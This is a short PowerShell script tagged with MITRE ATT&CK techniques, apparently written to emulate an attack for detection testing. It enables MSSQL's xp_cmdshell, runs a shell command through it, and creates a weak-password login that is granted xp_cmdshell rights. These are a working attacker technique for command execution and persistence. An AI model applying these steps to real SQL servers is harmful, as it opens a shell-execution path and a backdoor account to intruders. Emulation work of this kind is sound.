<#
  T1505.001 - Server Software Component: SQL Stored Procedures
  T1059.003 - Command and Scripting Interpreter: Windows Command Shell
  T1136.001 - Create Account
  MSSQL xp_cmdshell built-in function for executing shell commands, disabled by default
  This script will enable shell commands, execute a command and create an user with rights to execute shell commands
#>

# IN MSSQL with admin rights
# EXEC sp_configure 'show advanced options', '1';  
# EXEC sp_configure 'xp_cmdshell', 1; 

# With powershell
Import-Module SqlServer
# Enable Show Advanced Options
Invoke-Sqlcmd -Query "sp_configure 'Show Advanced Options', 1; RECONFIGURE;"
# Enable xp_cmdshell
Invoke-Sqlcmd -Query "sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
# Execute a test command
Invoke-Sqlcmd -Query "EXEC xp_cmdshell 'dir';"
# Create a mthcht user
Invoke-Sqlcmd -Query "CREATE LOGIN mthcht WITH PASSWORD = 'password';"
# Grant the mthcht user permissions
Invoke-Sqlcmd -Query "GRANT EXECUTE ON xp_cmdshell TO mthcht;"
# Create a test table
Invoke-Sqlcmd -Query "CREATE TABLE mthchttable (ID int, Name varchar(50));"
# Insert sample data into the test table
Invoke-Sqlcmd -Query "INSERT INTO mthchttable (ID, Name) VALUES (1, 'mthcht'), (2, 'John');"
